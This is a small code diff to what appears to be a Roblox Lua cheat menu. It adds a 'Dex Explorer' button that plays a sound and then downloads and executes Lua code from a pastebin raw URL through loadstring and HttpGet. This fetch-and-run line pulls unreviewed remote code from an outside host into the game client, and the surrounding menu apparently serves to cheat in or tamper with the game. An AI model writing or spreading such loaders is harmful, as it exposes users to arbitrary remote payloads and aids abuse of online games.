@@ -536,6 +536,10 @@ tab5:NewButton("Underhit (F)",function()
     end)
 
 
-        
+    tab8:NewButton("Dex Explorer",function()
+        local music3 = game:GetService("StarterGui").forcePowers.equip
+    music3:play()
+loadstring(game:HttpGet('https://pastebin.com/raw/pnMaYvkg'))()
+end)
             
 
